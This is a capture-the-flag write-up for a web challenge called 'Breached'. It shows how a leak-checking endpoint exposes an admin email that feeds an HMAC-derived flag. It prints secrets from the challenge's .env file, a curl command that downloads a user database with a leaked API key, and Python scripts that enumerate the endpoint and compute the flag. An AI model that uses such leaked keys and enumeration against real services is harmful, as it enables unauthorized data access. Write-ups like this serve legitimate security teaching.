# Breached

> Challange Description:
> The admin email of Acme Surveys was leaked, but the identity of the admin is unknown. The objective was to identify the admin email using the provided leak-checking service and derive the flag through a cryptographic HMAC comparison implemented in the backend. The challenge highlights how auxiliary endpoints can undermine otherwise secure cryptographic constructions.

Title: "Breached"<br>
Date: "2025-11-29"<br>
Author: "scap3sh4rk"<br>
Tags: ["web", "endpoint-detection", "medium"]<br>
Read_time: "8 min read"<br>

---

## Challenge Metadata

- **Room Name:** breached
- **Platform:** IIT Bombay CTF 2025
- **URL:** https://asdasdasd
- **Difficulty:** Medium
- **Category:** Web
- **Points:** 200

---

## Introduction

This challenge revolves around identifying a hidden administrative identity and leveraging a cryptographic mechanism to derive the flag. The backend relies on HMAC-SHA256 to determine administrative privileges. However, an auxiliary API unintentionally leaks identifying metadata. The objective is to correlate this leak with the cryptographic logic to recover the flag.

## 1. Reconnaissance

Initial review of the provided artifacts revealed:

- Flask web application
- Docker environment
- `.env` file containing cryptographic secrets and API keys

The `.env` file exposed:

```
FLAG_SECRET = 3HZ0jv5EuC4WHoJnxGKDxuoD9mCkxHMlJz3MucS6U40k7lLdqDqlF2pmeDRT2W5F
ADMIN_API_KEY = 6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0
```

The core validation condition:

```
HMAC_SHA256(FLAG_SECRET, email) == FLAG_TOKEN
```

### Passive Reconnaissance

- Reviewed Flask source code
- Inspected `.env` configuration
- Analyzed route definitions and authentication logic

### Active Reconnaissance

Identified external service endpoint:

```
https://tlctf2025-hibc.chals.io/check_email?email=<email>
```

Database download endpoint:

```bash
curl -s -H "X-API-Key: 6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0" https://tlctf2025-data-app.chals.io/download_db -o runtime_db.csv
```

---

## 2. Scanning and Enumeration

The downloaded CSV contained multiple user emails. Each email was tested against `/check_email`.

Typical response:

```json
{
  "email": "test@acme.test",
  "plaintext_password": null,
  "pwned": false
}
```

Hypothesis:

The admin email would produce an anomalous response.

---

## 3. Gaining Access (Exploitation)

### Vulnerability Analysis

The vulnerability was not cryptographic weakness but metadata leakage:

- The admin identity was not stored.
- It was derived using HMAC comparison.
- The auxiliary API leaked which email was “pwned.”
- The only pwned email corresponded to the admin.

### Exploitation Steps

Automated enumeration:

```python
import csv, requests

URL = "https://tlctf2025-hibc.chals.io/check_email"

with open("runtime_db.csv") as f:
    r = csv.DictReader(f)
    for row in r:
        email = row["email"]
        resp = requests.get(URL, params={"email": email})
        data = resp.json()

        if data.get("pwned") or data.get("plaintext_password") or data != {
            "email": email,
            "plaintext_password": None,
            "pwned": False
        }:
            print("ADMIN FOUND:", email)
            print(data)
            break
```

Result:

```
ADMIN FOUND: blake.baker20@acme.test
{"email": "blake.baker20@acme.test", "plaintext_password": null, "pwned": true}
```

---

## 4. Privilege Escalation

Not applicable. Administrative status was determined via HMAC comparison rather than stored roles. Identifying the correct email was sufficient.

---

## 5. Post-Exploitation & Loot

Using the discovered admin email:

```python
import hmac, hashlib

SECRET = "3HZ0jv5EuC4WHoJnxGKDxuoD9mCkxHMlJz3MucS6U40k7lLdqDqlF2pmeDRT2W5F"
email  = "blake.baker20@acme.test"

token  = hmac.new(SECRET.encode(), email.encode(), hashlib.sha256).hexdigest()

print("FLAG: trustctf{" + token[:12] + "}")
```

The correct flag was derived from the first 12 characters of the HMAC digest.

---

## Conclusion

The cryptographic implementation itself was correct. The failure occurred due to information leakage via an auxiliary endpoint. Secure systems must consider side channels and metadata exposure, not just algorithmic correctness.

> "Security fails at the boundaries, not the primitives." — scap3sh4rk

---

*writeup by @scap3sh4rk*
